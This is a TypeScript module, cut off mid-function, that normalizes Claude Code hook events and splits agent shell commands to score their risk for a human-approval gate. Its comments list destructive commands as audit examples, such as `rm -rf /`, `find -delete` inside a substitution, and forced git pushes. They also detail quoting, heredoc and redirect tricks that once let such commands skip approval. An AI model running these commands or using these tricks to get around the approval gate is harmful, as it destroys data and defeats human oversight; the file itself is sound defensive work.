/**
 * Claude Code hooks → NormalizedEvent 正規化 (provider=claude_code, source=hooks)。
 *
 * 仕様出所: code.claude.com/docs/en/hooks (WebSearch 2026-06)。
 * HTTP hook の POST body は command-hook stdin と同形:
 *   { session_id, transcript_path, cwd, permission_mode, hook_event_name, ...event固有 }
 *
 * マッピング表は decision 019e8e49-725d を参照。生 hook 形状は UI へ素通ししない
 * (plan.md §14): 必要な構造化フィールドのみ payload に正規化する。
 *
 * ⚠️ ここで作る候補は EventSink.emit() に渡され、その中で redaction されてから
 *    parse/persist/send される。normalize 自体は redaction しない (choke point は一箇所)。
 */
import {
  type Continuation,
  type EndKind,
  type EventType,
  type PolicyCategory,
  type RiskLevel,
  type StartKind,
  type State,
  WorkItemStatus,
  coerceWorkItemStatus,
  terminalContinuation,
} from "@actradeck/event-model";

import { type BuildEventInput, buildEvent } from "./event-factory.js";
import { checkFields } from "./check-classifier.js";
import { governanceModeFor } from "./permission-mode.js";
import { redactString } from "@actradeck/redaction";

/** Claude Code hook の共通入力 (HTTP body = command stdin と同形)。 */
export interface HookCommonInput {
  readonly session_id: string;
  readonly transcript_path?: string;
  readonly cwd?: string;
  readonly permission_mode?: string;
  readonly hook_event_name: string;
  readonly agent_id?: string;
  readonly agent_type?: string;
  /**
   * ツール呼び出しの一意 ID (実観測 `toolu_<id>`、PreToolUse/PostToolUse 共通)。
   * command.started↔completed を結ぶ相関キーの出所 (toolUseCorrelationId)。
   */
  readonly tool_use_id?: string;
  // event 固有フィールド (loose)。
  readonly [k: string]: unknown;
}

/** PreToolUse の tool_input でよく使うフィールド。 */
interface ToolInput {
  readonly command?: string;
  readonly file_path?: string;
  readonly query?: string;
  readonly [k: string]: unknown;
}

/**
 * 高リスクコマンド判定 (plan.md §18 Risk Lens / QA-2 監査所見)。
 *
 * 字面マッチではなくトークン正規化ベースで判定する。承認バイパスを許さないため
 * **判定不能・曖昧は high に倒す (fail-safe)**。検出対象:
 *   - rm の再帰+強制 (-r/-R/-f/--recursive/--force、順不同・融合 -fr/-rf・分割)
 *   - git push の強制 (-f/--force/--force-with-lease)
 *   - chmod の world-writable (数値 xx7 / a+w / o+w) と -R
 *   - mkfs / dd of= / fork bomb / DROP|TRUNCATE TABLE / migrate / production
 *   - ブロックデバイスへの書込/リダイレクト (> /dev/sd* /dev/nvme* /dev/disk* と dd of=)
 *   - SEC-1: シェル/インタプリタのインラインコード (`sh -c "..."` / `python -c "..."` /
 *     `node -e "..."` 等) と eval / コマンド置換 `$(...)`・backtick。内側コードを再分類できれば
 *     その risk、再パース不能なら fail-safe で medium に床上げ (over-gate 許容)。
 *
 * ⚠️ この判定は承認ゲート (approval-bridge.requiresHumanApproval) の唯一の根拠。
 *    false-negative = 無承認で破壊的操作が走る = INV-APPROVAL 違反。
 */

/**
 * payload に格納する command 文字列の最大長 (再#SEC-1)。
 * 巨大コマンドを無切り詰めで保持・redaction すると負荷源になるため上限を設ける。
 */
export const MAX_COMMAND_LEN = 4096;

/**
 * quote 非対応の旧分割 (2026-08-14 以前の唯一の実装 + SEC-CQ2-1 の単一 `&`)。2 つの役割で温存する:
 *  1. 未終端クォート/未終端 heredoc で構造解析できないコマンドの fail-safe フォールバック。
 *  2. SEC-CQ-1 の**非対称 union backstop** の legacy 側 split (classifyCommandRisk が
 *     この分割でも一度分類し、legacy が high のときのみ high へ引き上げる)。
 * quote-aware 側の解析ミス (phantom quote / heredoc 誤認) がどう転んでも、旧分類器が high と
 * 呼んだ入力は high に留まる。新規の呼び出し元を作らないこと。
 *
 * 単一 `&` を区切りに含める (SEC-CQ2-1 ≡ QA-CQ2-1・CQ-R2 監査 H): fallback と union backstop は
 * どちらも本分割を使うため、ここが `&` を見ないと ANSI-C quoting の位相ずれ・未終端 heredoc 等で
 * **二層が同時に** `cmd & rm -rf /` の rm を見失い、実 bash が実行するのに low (承認カード無し)
 * になる fail-open が実測された。ただし `&` は **background 演算子のときだけ** 区切りで、
 * redirect の一部 (`2>&1` `>&2` `<&-` `&>file`) は 1 トークンとして残す (SEC-CQ3-1・R3 監査 H)。
 *
 * ⚠️ 分割器へ演算子を足す変更は **risk に対して単調ではない** (SEC-CQ3-2 ≡ TDA-CQ3-1 ≡ QA-CQ3-1
 * で訂正・TDA-CQ4-3 で計数追加): 本関数は union backstop の legacy 側 (high-only ゆえ FP 中立)
 * であると同時に **primary の fallback** でもあり、fallback 役では粒度がそのまま primary の
 * 判定になる。**historical measurement** (base→R3 HEAD の 22,620 入力 differential・監査レーン実測。R4 の
 * redirect 除去モデル以降の profile は異なる — R5 実測 base→HEAD は low→high 148 / medium→high 72 /
 * medium→low 30。以下は「単調でない」ことの根拠であって現行 HEAD の分布ではない):
 *   **medium→low 1,894** (最大の de-gating セル) / high→low 126 / high→medium 79 /
 *   low→medium 371 / low→high 811 / medium→high 1,089。
 * つまり細かく割ると (a) command 名とフラグが分断されて high/medium→low へ**下がり**、
 * (b) 断片先頭がメタ文字になり「解析不能→medium 床上げ」で新規承認カードも増える。
 * 単調性は仮定せず、INV-APPROVAL-REDIRECT-DUP-NOT-BACKGROUND (演算子×位置の全組合せ) /
 * INV-APPROVAL-FALLBACK-BACKGROUND-SEPARATOR / FP 予算 pin で両方向を機械的に担保する。
 * なお **等価 metatest は本クラスを検出できない** (TDA-CQ4-5): 両実装が同じ誤答で一致する形
 * (`\>&` 等) では 9,330 件緑のまま fail-open が成立する。一致は drift の tripwire であって
 * 正しさの証拠ではない — 正しさ側は上記マトリクスが担う。
 */
export function splitSegmentsQuoteUnaware(command: string): string[] {
  return command
    .split(/[;\n]|\|\||(?<![<>])&&|\||(?<![<>])&(?!>)|(?<![\d&])>{1,2}(?!&)|<<<|<{1,2}(?!&)/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/** 分類器内部で segment 分割を差し替えるための型 (SEC-CQ-1 union backstop 用・下記参照)。 */
type SegmentSplitter = (command: string) => string[];

interface PendingHeredoc {
  readonly delimiter: string;
  readonly quoted: boolean;
  readonly stripTabs: boolean;
}

/**
 * 語境界文字か — シェル文法における「語を終わらせる非クォート文字」の**単一出所**。
 *
 * **TDA-CQ6-3 (v0.8 統合)**: この判定はかつて 3 通りに手書きされ、互いに食い違っていた
 * (`SEPARATOR_OR_SPACE_RE` = `/[\s;|&<>]/` / `WHITESPACE_RE` = `/\s/` / インライン
 * `=== " " || === "\t"`)。どれを使うかで「語がどこで終わるか」が変わるため、redirect 対象語・
 * heredoc delimiter・fd 接頭辞・コメント語頭判定が別々の境界観を持ち、R2〜R9 の各ラウンドで
 * 「一方だけが正しく、もう一方が 1 文字ずれる」形の H を生み続けた。境界の定義は 1 本にする
 * (security-gate-reuse-canonical-parser)。
 *
 * 空白だけを見たい箇所 (「語頭か」でなく「行内の詰め物か」) は `isBlank` を使う。両者は目的が
 * 違うので統合しない — 名前で区別し、どちらを意図したかがコードから読めるようにする。
 */
export function isWordBoundaryChar(c: string | undefined): boolean {
  return c !== undefined && WORD_BOUNDARY_RE.test(c);
}
const WORD_BOUNDARY_RE = /[\s;|&<>]/;

/** 語の途中に現れうる詰め物 (空白/タブ)。`isWordBoundaryChar` とは目的が異なる。 */
function isBlank(c: string | undefined): boolean {
  return c === " " || c === "\t";
}

/**
 * 空白だけを語境界とみなす述語 (`tokenize` 用)。
 *
 * `tokenize` の入力は既に `splitSegments` が区切った**セグメント**なので、そこに残っている
 * `;` `|` `&` `<` `>` は「正常な区切り」ではなく **解析不能の痕跡**である
 * (`splitSegmentsUnparseable` は諦めたときコマンド全体を 1 セグメントとして渡す)。
 * ここで区切ると `aa;'` が `["aa"]` = クリーンな実行可能名に見え、`unanalyzableSegmentRisk` の
 * medium 床が黙って外れる。メタ文字は語に貼り付けたまま残し「このセグメントは構造判定できない」
 * という信号を保つ (fail-safe / over-gate 方向)。
 *
 * 語の読み方そのものは `readWord` の単一出所を共有し、違うのは**境界集合だけ**である点が要点
 * (以前は語の読み方ごと別実装で、引用の扱いが食い違っていた = R10 H5)。
 */
function isWhitespaceBoundaryChar(c: string | undefined): boolean {
  return c !== undefined && WHITESPACE_RE.test(c);
}

/**
 * 構造解析不能な入力の fail-safe 分割 (SEC-CQ5-2・R5 監査 H)。
 *
 * legacy 分割を返すだけでは **over-gate にならない**: legacy は `<<` や `<`/`>` で**より細かく**
 * 割るため、`rm <<EOF -rf /path` (実 bash は heredoc 未終端の警告を出しつつ rm -rf を実行する) が
 * `["rm", "EOF -rf /path"]` になり、program 名が引数から切れて low/[] = 二層とも素通りしていた。
 * しかも fallback 時は primary と legacy が同じ分割になるため **非対称 union backstop が
 * この場合だけ無効化**される (backstop は「quote-aware 側の解析ミス」を legacy で補う設計で、
 * 両者が一致するときは補うものが無い)。
 * そこで解析不能時は legacy 分割に加えて **command 全体を 1 セグメント**として渡し、分類器が
 * 「切られていない形」も必ず見るようにする (over-gate 方向 = 解析不能入力に対する安全側)。
 */
function splitSegmentsUnparseable(command: string): string[] {
  const legacy = splitSegmentsQuoteUnaware(command);
  const whole = command.trim();
  if (whole.length === 0) return legacy;
  return legacy.length === 1 && legacy[0] === whole ? legacy : [...legacy, whole];
}

/** fd 指定の走査上限 (SEC-CQ5-3): 末尾からこの文字数までで打ち切り、入力長に対し線形を保つ。 */
const FD_SCAN_LIMIT = 64;
/**
 * 分類器が解析を諦めるコマンド長 (これを超えたら fail-safe high)。
 * 走査上限系の定数はここから導出し、「上限が理由でセキュリティ制御が飛ぶ」形を作らない。
 */
export const MAX_ANALYZABLE_COMMAND_LEN = 16 * 1024;

/**
 * 置換 (`$(…)` / backtick / `<(…)`) の走査上限。同期 hook パスゆえ有界にする (SEC-CQ5-3 と同方針)。
 *
 * **コマンド長 fail-safe と同値にする (SEC-R7-1・R7 監査 H・R6 で私が導入した回帰)**:
 * 8192 に固定していたため、~8.2KiB〜16KiB の入力で `substitutionEnd` が未終端扱い (-1) となり、
 * process substitution の再分類が丸ごと飛んで `low`/`[]` = 通常モードと bypass の**両方**が
 * 素通りになった (base は bypass ゲートを保っていたので厳密な回帰)。
 * この bound は 16KiB のコマンド長 fail-safe が既に与える保証を一切増やさない一方、
 * その手前に**無言の穴**を作っていた。両者を結合し、-1 は「本当に未終端」だけを意味させる。
 */
const SUBSTITUTION_SCAN_LIMIT = MAX_ANALYZABLE_COMMAND_LEN;
/** `{v}>` の変数名として妥当か (bash の名前規則)。長さは FD_SCAN_LIMIT で既に有界。 */
const FD_VAR_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
/** grouping ラッパの前後トリム専用の空白判定 (語境界とは目的が違う・`isWordBoundaryChar` を参照)。 */
const WHITESPACE_RE = /\s/;

/**
 * `i` が heredoc 以外の redirect 演算子の先頭ならその長さを返す (0 = 演算子でない)。
 *
 * SEC-CQ4-1/2/3 (R4 監査 H×3): 文字単位の隣接判定 (`previous === ">"` 等) は
 * 「演算子の途中で 1 文字だけ見る」ため、`&>>` の 2 つ目の `>`・escape された `\>` の直後の `&`
 * のように**位置が 1 つずれた形**で毎回穴が開いた (3 ラウンド連続)。演算子を**トークンとして
 * 一括認識**することで、この off-by-one クラスを構造的に消す。
 */
function redirectOperatorLength(command: string, i: number): number {
  const c = command[i];
  const next = command[i + 1];
  if (c === "&") return next === ">" ? (command[i + 2] === ">" ? 3 : 2) : 0; // &>> / &>
  if (c === ">") return next === ">" || next === "&" || next === "|" ? 2 : 1; // >> >& >| >
  if (c === "<") {
    if (next === "<") return 0; // heredoc / herestring は専用分岐が扱う。
    return next === "&" || next === ">" ? 2 : 1; // <& <> <
  }
  return 0;
}

/**
 * コマンドを ; | && || (と redirect) で区切った各セグメントへ分解 (パイプ/連結内の個別 cmd を見る)。
 *
 * 承認ゲート偽陽性の実害修正 (2026-08-14): 旧実装はシングル/ダブルクォート内の `|` `;` でも
 * 分割していたため、`rg -n 'a|b.*[Cc]' path` の引用済み正規表現が `|` で裂け、regex メタ文字
 * (`*` `[`) で始まる断片が segment 先頭に来て「構造解析不能 → fail-safe medium 床上げ」が発動、
 * 無害な検索コマンドが軒並み承認カード化 → 操作者不在の 30 秒で全 deny = エージェント実質
 * ブロックの実インシデントを起こした。シェル文法どおり quote 内の演算子はデータであり
 * 分割点ではない。
 *
 * 安全性の設計 (INV-APPROVAL: false-negative を許さない):
 *  - シングルクォート内は shell が一切展開しない (真に inert)。ダブルクォート内の `$(...)` /
 *    backtick は実行されるが、分割を抑止しても **文字列としては segment に残る**ため、既存の
 *    hasCommandSubstitution / インライン再分類 (SEC-1) が同じ検出点で検出する (入力の
 *    segment 区切りは変わるため「検出点の入力範囲」は変わる — TDA-CQ-2 の残余は下記 union
 *    backstop が覆う)。
 *  - `echo "rm -rf /" | sh` のような「quote 内は inert・実行はパイプ先」の形は、パイプ先の
 *    stdin シェル (operand 無し) を既存の fail-safe が gated にする (こちらも不変)。
 *  - backslash escape を処理する: `\"` はクォートを開かない (処理しないと `echo \"a|rm -rf /\"`
 *    の実パイプを quote 内と誤認して **rm を素通しする false-negative** になる)。
 *  - **非クォート文脈を shell 文法どおり扱う (SEC-CQ-1・2026-08-14 R1 監査 H)**: `#` コメントは
 *    行末まで読み飛ばし、heredoc (`<<[-]DELIM`) は本文を消費する (quoted delimiter は真のデータ
 *    ゆえ破棄・unquoted delimiter は `$()`/backtick が活性なため本文を segment 文字列に残して
 *    置換検出を保つ)。これを欠くとコメント/heredoc 本文中のアポストロフィ (don't / it's) が
 *    quote 開閉に数えられ、**偶数で釣り合うと後続の実区切りを phantom quote が飲み込み、実行
 *    される `rm -rf` が low (承認カード無し) になる**回帰が実測された。
 *  - 単一 `&` (background 終端) も shell 文法どおり区切りにする (SEC-CQ-2・pre-existing:
 *    旧分割は `&&` のみで `sleep 0 & rm -rf /` の rm を素通した)。
 *  - 未終端クォート・未終端/解析不能 heredoc は旧 quote 非対応分割へフォールバック
 *    (over-gate 方向・fail-safe)。
 *  - さらに解析ミスの構造 backstop として、classifyCommandRisk が**非対称 union** を取る
 *    (下記 classifyCommandRisk docstring 参照)。
 *  - backtick は意図的に quote 扱いしない (TDA-CQ-7): 内容が実行されるため「データ」ではなく、
 *    区切り文字を含む backtick は素通しせず既存の hasCommandSubstitution 検出に委ねる。
 *    tokenize の QUOTE_CHARS (単語連結処理) とは目的が異なる非対称で、揃えてはならない。
 *  - 1 パス文字走査を基本とし ReDoS 経路を増やさない。**正直な scope (QA-CQ5-9・R5 監査)**:
 *    redirect の除去だけは「演算子 → 対象語 → fd 接頭辞」の局所再走査を伴うため厳密な単一パス
 *    ではなく、redirect が密な入力では線形定数が上がる (監査実測: 4KB / redirect 1024 個で
 *    splitSegments 0.955ms vs 平文 0.126ms)。fd 接頭辞の走査は FD_SCAN_LIMIT で有界化済み
 *    (SEC-CQ5-3: 有界化前は蓄積バッファ全体への `$` アンカー正規表現で O(N²)・実測 160 秒)。
 *
 * Consumer (TDA-CQ2-4): 承認分類 (classifyCommandRisk / classifyCommandWithCategories /
 * isNetworkEgressCommand) に加えて **check-classifier (classifyCheck) も本分割を消費する**。
 * check 認定側には union backstop が**適用されない** (quote-aware 分割のみ) — check は
 * 「検証を実行した」ことの credit であり、取りこぼしは under-credit (安全方向) に倒れるため。
 * ただし **fallback 経路では legacy 分割が check 認定にも届く** (TDA-CQ3-2・R3 監査): 未終端
 * heredoc/quote で splitSegments が splitSegmentsQuoteUnaware を返すため、bash が実際には
 * 実行しないコマンドへ check_kind が付きうる (union 非適用でも粒度は legacy)。credit の
 * 過大方向ゆえ ADR 0015 の under-credit 原則と逆で、追跡 task で扱う。
 * backstop の適用範囲を変える修正は boundary-gate 走査範囲変更 = full 監査既定。
 *
 * **redirect は区切りでも語でもない (SEC-CQ4-1/2/3 ≡ TDA-CQ4-1/2/6・R4 監査 H)**: 演算子
 * (`>` `>>` `>|` `<` `<>` `>&` `<&` `&>` `&>>` `<<<` `<<[-]`) と対象語・fd 指定を segment から
 * **除去**し、プログラム名と残りの引数を同一 segment に保つ。旧実装は redirect 位置で分割して
 * いたため `rm >out.log -rf /` が ["rm", "out.log -rf /"] となり、実 bash が削除するのに low =
 * 承認カード無しだった (`2>` だけは digit 規則で偶然 whole に残っていた)。文字単位の隣接判定
 * (`previous === ">"` 等) は演算子の途中で 1 文字だけ見るため `&>>` の 2 つ目の `>`・escape 済み
 * `\>` の直後の `&` と、**位置が 1 つずれるたびに穴が開いた** (3 ラウンド連続)。演算子を
 * トークンとして一括認識することで、この off-by-one クラスを構造的に閉じる。
 *
 * ⚠️ 承認ゲート境界の走査範囲 (scope) 変更に当たる — 変更時は finding-registry の full 監査既定。
 * INV-APPROVAL-QUOTED-OPERATORS / INV-APPROVAL-NONQUOTE-CONTEXT-SEPARATORS /
 * INV-APPROVAL-FALLBACK-BACKGROUND-SEPARATOR / INV-APPROVAL-SPLIT-LAYER-CONTRACT /
 * INV-APPROVAL-REDIRECT-DUP-NOT-BACKGROUND (演算子 × 位置の 174 組合せマトリクス + escape 形)
 * が両方向を回帰固定する。
 */
export function splitSegments(command: string): string[] {
  const segments: string[] = [];
  let current = "";
  /**
   * 直前に消費した escape ペア (`\x`) の終端 index (SEC-R6-1)。
   * `escapePairEnd === i` なら「`i-1` の文字は escape 済み」= 区切りとして数えてはならない。
   * `#` の語頭判定がメイン走査の escape 状態を共有するための唯一の状態 (raw な文字隣接判定を廃止)。
   */
  let escapePairEnd = -1;
  /**
   * redirect 対象語として除去したが**中身が実行される**置換 (TDA-CQ6-1 ≡ QA-CQ6-1)。
   * 走査終了後に追加 segment として付け足す (現在の segment を割らない = R4 の不変条件を保つ)。
   */
  const elidedExecutableTargets: string[] = [];
  const pendingHeredocs: PendingHeredoc[] = [];
  const push = (): void => {
    const trimmed = current.trim();
    if (trimmed.length > 0) segments.push(trimmed);
    current = "";
  };
  /**
   * redirect の対象語 (`> out.log` の `out.log`) の終端 index を返す。未終端 quote は -1。
   *
   * **メイン走査と同じ escape/quote 規則で 1 語を読む (TDA-CQ5-1・R5 監査 H)**: 素朴な
   * 「空白/区切りまで」実装は escape された空白を語境界と誤認し、`>a\ b rm -rf /` で対象語を
   * `a\` までしか食わず、残った `b` がコマンド名になって実行される rm が low/[] になった
   * (base/R4 は medium|high-risk-other でゲート = bypass でも保持していた回帰)。
   * shell の 1 語は quote 断片と escape を跨いで連結する (`>"a b"c` / `>a\ b`) ため、
   * 語の走査規則はメインループと**同一出所の意味論**でなければならない
   * (security-gate-reuse-canonical-parser)。
   */
  const targetEnd = (from: number): number => {
    let j = from;
    while (isBlank(command[j])) j += 1;
    // 語の読み方はメインループ・heredoc delimiter と**同一出所** (`readWord`)。
    //   置換 (`>$(find …)`) は語の一部として読み切る — 空白で切ると対象語が `$(find` までになり、
    //   実行される中身が分類から落ちる (TDA-CQ6-1 ≡ QA-CQ6-1)。
    //   未終端 quote/置換 = 構造解析不能。黙って飲み込まず fail-safe の legacy 分割へ倒す。
    const word = readWord(command, j, isWordBoundaryChar, { failures: 0 });
    return word.unterminated ? -1 : word.end;
  };
  /**
   * fd 指定 + 演算子 + 対象語を segment から取り除く (redirect は語を供給しない)。
   * 未終端 quote のときは -1 を返し、呼び出し側が legacy fallback へ倒す。
   */
  const elideRedirect = (operatorEnd: number): number => {
    stripFdPrefix();
    const end = targetEnd(operatorEnd);
    if (end < 0) return end;
    // **TDA-CQ6-1 ≡ QA-CQ6-1 (R6 監査 H・693e782 起因の回帰)**: redirect の対象語は
    //   「語を供給しないデータ」として除去してよいが、**中身が実行される置換**
    //   (`$(…)` / backtick / `<(…)` / `>(…)`) の場合は話が別で、bash はそれを実行する
    //   (`cp a >$(find /tmp -delete)` は実際に find を走らせる — stub 実測済み)。
    //   除去したまま捨てると分類器から完全に消え、**通常モードの承認カードと bypass の
    //   category ゲートを同時に失う**。
    //   ここで segment を分割して残すことはできない (`rm >$(x) -rf DIR` の `rm` が引数から
    //   切り離され R4 で閉じた穴が再発する)。よって **末尾に追加 segment として付け足す**
    //   (`splitSegmentsUnparseable` が command 全体を足すのと同じ発想・分割順は分類に無関係)。
    const target = command.slice(operatorEnd, end).trim();
    if (target.length > 0 && hasExecutableSubstitution(target))
      elidedExecutableTargets.push(target);
    return end;
  };
  /**
   * 直前の語が fd 指定 (`2>` の `2` / `{v}>` の `{v}`) なら segment から外す。
   *
   * **語全体が数字/`{name}` のときだけ** (SEC-CQ5-4 / TDA-CQ5-L1): bash は `file2>out` の `2` を
   * fd と見なさない。語末の数字を無条件に削ると `base64>out` が `base` に、`pytest2>x` が
   * `pytest` になり、check-classifier が実行されていない検証コマンドへ credit を出す
   * (ADR 0015 が禁じる over-credit 方向)。
   *
   * **正規表現でなく線形の末尾走査で行う (SEC-CQ5-3・R5 監査 H)**: `/\d+$/` 系は末尾が
   * 「数字の並び + 非数字」のバッファで開始位置ごとに後戻りし O(N²) になる。この関数は
   * redirect 演算子ごとに呼ばれ、承認判定は **hook の同期パス**にあるため、1 個の
   * `tool_input.command` で sidecar のイベントループ全体 (承認 relay・timeout タイマ・
   * 他セッションの hook) を止めうる。走査は末尾から高々 `FD_SCAN_LIMIT` 文字で打ち切る。
   */
  function stripFdPrefix(): void {
    const end = current.length;
    if (end === 0) return;
    const floor = end > FD_SCAN_LIMIT ? end - FD_SCAN_LIMIT : 0;
    if (current[end - 1] === "}") {
      let k = end - 2;
      while (k >= floor && current[k] !== "{") k -= 1;
      if (k < floor) return;
      const name = current.slice(k + 1, end - 1);
      if (!FD_VAR_NAME_RE.test(name)) return;
      if (k > 0 && !isWordBoundaryChar(current[k - 1])) return; // 語の一部。
      current = current.slice(0, k);
      return;
    }
    let k = end;
    while (k > floor && (current[k - 1] as string) >= "0" && (current[k - 1] as string) <= "9")
      k -= 1;
    if (k === end) return; // 末尾が数字でない。
    if (k > 0 && !isWordBoundaryChar(current[k - 1])) return; // `base64` / `pytest2` は fd でない。
    current = current.slice(0, k);
  }
  let i = 0;
  while (i < command.length) {
    const ch = command[i] as string;
    // quote 外: backslash は次の 1 文字を字義どおりにする (\" \| \; は開閉/分割に使わない)。
    if (ch === "\\" && i + 1 < command.length) {
      current += ch + (command[i + 1] as string);
      i += 2;
      escapePairEnd = i; // SEC-R6-1: 直前の 1 単位が escape ペアだったことを記録する。
      continue;
    }
    // `#` コメント (単語頭のみ = 先頭 or 空白/区切り直後)。行末まで shell は読まない (SEC-CQ-1)。
    // `$#` / URL fragment (`http://x#y`) は前が非空白ゆえ字義どおり残る。
    //
    // **SEC-R6-1 (R6 監査 H・99a42fc 起因の回帰)**: 語頭判定は raw な `command[i-1]` を読んでいたため、
    //   escape された区切り文字 (`\>` `\<` `\|` `\;` `\&` `\ `) の直後を「区切り直後」と誤認し、
    //   phantom comment として**行の残りを丸ごと捨てて**いた。bash は escape された文字を通常語の
    //   一部として扱うのでコメントは始まらず、`echo a\># ; rm >x -rf DIR` は実際に削除を実行する。
    //   しかもこの破棄は `splitSegmentsUnparseable` を経由しない唯一の経路で、legacy 分割は
    //   `>` で語を割り `rm` と引数を切り離すため union backstop も救えない = 二層 fail-open。
    //   メイン走査の escape 状態 (`escapePairEnd`) を共有し、escape 済み文字は境界と見なさない。
    //   これは「`splitSegments` が捨ててよいのはシェル的に正当なコメントだけ」という不変条件でもある。
    if (ch === "#") {
      // 語頭判定は収集器と共有する単一出所 (TDA-CQ9-2)。片方だけがコメントを尊重すると、
      //   コメント本文が「コード」として走査され偽陽性を生む。
      if (startsComment(command, i, escapePairEnd)) {
        const nl = command.indexOf("\n", i);
        i = nl === -1 ? command.length : nl; // `\n` 自体は通常の区切りとして処理させる。
        continue;
      }
      current += ch;
      i += 1;
      continue;
    }
    // **ANSI-C / locale quoting を 1 スパンとして消費する (SEC-CQ9-1・R9 監査 H)**:
    //   `$'…'` は bash が backslash escape を処理するため `\'` では閉じない。`$` を通常文字として
    //   流し `'` で単一引用を開く素の状態機械は 1 文字早く閉じ、以降の quote 位相が反転する。
    //   反転すると `;` `>` `<(` が引用の内外を取り違え、
    //   `cat $'a\'b' x; > /tmp/o rm -rf /srv` の rm が分類から丸ごと消えた (実 bash は実行する)。
    // **引用は 1 スパンとして消費する (v0.8 統合 + SEC-CQ9-1・R9 監査 H)**:
    //   `'…'` / `"…"` / `$'…'` / `$"…"` のどれも `quoteSpanEnd` が単一出所で読む。以前はここだけ
    //   独自の `quote` 状態変数を持ち、ANSI-C (`$'…'`) の escape 規則が後付けの特例分岐だった。
    //   `$'a\'b'` は bash が backslash を処理するため `\'` では閉じない。素の状態機械は 1 文字
    //   早く閉じ、以降の quote 位相が全部反転して `;` `>` `<(` の内外を取り違える
    //   (`cat $'a\'b' x; > /tmp/o rm -rf /srv` の rm が分類から丸ごと消えた・実 bash は実行する)。
    //   引用の**開き・閉じ・escape 規則**を 1 箇所に閉じ込めることで、この位相ずれのクラスを
    //   構造的に消す (security-gate-reuse-canonical-parser)。
    const spanEnd = quoteSpanEnd(command, i);
    if (spanEnd === -1) return splitSegmentsUnparseable(command); // 未終端 → fail-safe。
    if (spanEnd > 0) {
      current += command.slice(i, spanEnd);
      i = spanEnd;
      continue;
    }
    if (ch === ";") {
      push();
      i += 1;
      continue;
    }
    if (ch === "\n") {
      if (pendingHeredocs.length > 0) {
        // heredoc 本文の消費 (FIFO・POSIX)。quoted delimiter は真のデータゆえ破棄、
        // unquoted は $()/backtick が活性なため本文を segment に残して置換検出を保つ。
        i += 1;
        let body = "";
        while (pendingHeredocs.length > 0) {
          const heredoc = pendingHeredocs.shift() as PendingHeredoc;
          while (i <= command.length) {
            const nl = command.indexOf("\n", i);
            const end = nl === -1 ? command.length : nl;
            const line = command.slice(i, end);
            const compare = heredoc.stripTabs ? line.replace(/^\t+/, "") : line;
            i = nl === -1 ? command.length : nl + 1;
            if (compare === heredoc.delimiter) break;
            if (!heredoc.quoted) body += `\n${line}`;
            if (nl === -1) break; // 入力末尾に到達 (delimiter 不一致のまま)。
          }
          // **delimiter 不一致のまま入力末尾 = bash は EOF を終端として扱い、コマンドを実行する**
          //   (SEC-CQ11-4・R11 監査 H・pre-existing): 以前はここで legacy 分割へ倒していたが、legacy は
          //   `<<` を区切りとして割るため delimiter 語がプログラム名になり (`echo a ; <<EOF rm -rf /srv`
          //   → `["echo a", "EOF rm -rf /srv"]`)、実 bash が rm を実行するのに low[] = 二層とも素通り
          //   だった (12 形・`git push --force` も)。R5 SEC-CQ5-2 はプログラム先行形しか閉じていない。
          //   bash の意味論どおり「本文は EOF まで・展開規則は通常どおり」として読み切る方が、
          //   演算子と delimiter を除去済みの主分割 (`rm -rf /srv` が残る) をそのまま使えて厳密に安全側。
        }
        // コマンド語 (redirect 演算子・delimiter を除去済み) を確定する。
        push();
        // **本文はシェルの語ではない (SEC-CQ10-2・R10 監査 H・R9 起因)**: unquoted delimiter の
        //   本文で bash が実行するのは `$(…)` と backtick だけで、アポストロフィや二重引用は
        //   **データ**である (実 bash: `don't $(rm …) isn't` の rm は起動する・stub PATH で確認)。
        //   R9 は本文を通常セグメントとして流したため、下流の走査が引用意味論を当て、
        //   偶数個のアポストロフィが phantom 引用スパンを作って本物の `$()` を飲み込んだ
        //   (奇数個なら gated = 1 文字足すだけでゲートが外れる)。本文をセグメントに流すのを
        //   やめ、**heredoc の展開規則で置換だけを取り出して**末尾セグメントにする
        //   (`elideRedirect` が `>$(…)` を残すのと同じ発想)。quoted delimiter は展開なし = 何も出ない。
        const substitutions = heredocBodySubstitutions(body);
        if (substitutions === undefined) return splitSegmentsUnparseable(command); // 未終端置換。
        for (const sub of substitutions) elidedExecutableTargets.push(sub);
        continue;
      }
      push();
      i += 1;
      continue;
    }
    if (ch === "|") {
      push();
      i += command[i + 1] === "|" ? 2 : 1;
      continue;
    }
    if (ch === "&") {
      // `&>file` / `&>>file` は統合 redirect (演算子)。それ以外の `&` は `&&` (連結) も
      // 単一 `&` (background 終端・SEC-CQ-2) も区切り。
      const redirect = redirectOperatorLength(command, i);
      if (redirect > 0) {
        const elided = elideRedirect(i + redirect);
        if (elided < 0) return splitSegmentsUnparseable(command); // 未終端 quote → fail-safe。
        i = elided;
        continue;
      }
      push();
      i += command[i + 1] === "&" ? 2 : 1;
      continue;
    }
    if (ch === "<") {
      if (command[i + 1] === "<" && command[i + 2] === "<") {
        // herestring `<<<word`: 演算子も word も command の語ではない — まとめて除去する。
        const elided = elideRedirect(i + 3);
        if (elided < 0) return splitSegmentsUnparseable(command); // 未終端 quote → fail-safe。
        i = elided;
        continue;
      }
      if (command[i + 1] === "<") {
        // heredoc operator。delimiter word を読み取り、本文消費を次の `\n` に予約する。
        // 演算子と delimiter は語を供給しないため segment からは除去する (残る引数は同一
        // segment に留まる — `rm <<EOF -rf /` の `-rf` が rm から切れない・SEC-CQ4-3)。
        stripFdPrefix();
        i += 2;
        let stripTabs = false;
        if (command[i] === "-") {
          stripTabs = true;
          i += 1;
        }
        while (i < command.length && isBlank(command[i])) i += 1;
        // delimiter も**同じ語読取り**で読む。以前はここだけ独自の状態機械で、引用内 escape も
        //   `$'…'` も扱わなかった (語の読み方が 4 箇所に分かれていたことが R2〜R10 で同一クラスの
        //   H を生み続けた機構的原因・CQ-R6 裁定 019ffe0c)。
        const delimiterStart = i;
        const delimiterWord = readWord(command, i, isWordBoundaryChar, { failures: 0 });
        if (delimiterWord.unterminated) return splitSegmentsUnparseable(command); // 未終端。
        const delimiter = delimiterWord.literal;
        // bash: delimiter のどこか 1 文字でも引用/escape されていれば本文の展開は不活性になる。
        const delimiterQuoted = delimiter !== command.slice(delimiterStart, delimiterWord.end);
        i = delimiterWord.end;
        if (delimiter.length === 0) return splitSegmentsUnparseable(command); // 解析不能。
        pendingHeredocs.push({ delimiter, quoted: delimiterQuoted, stripTabs });
        continue;
      }
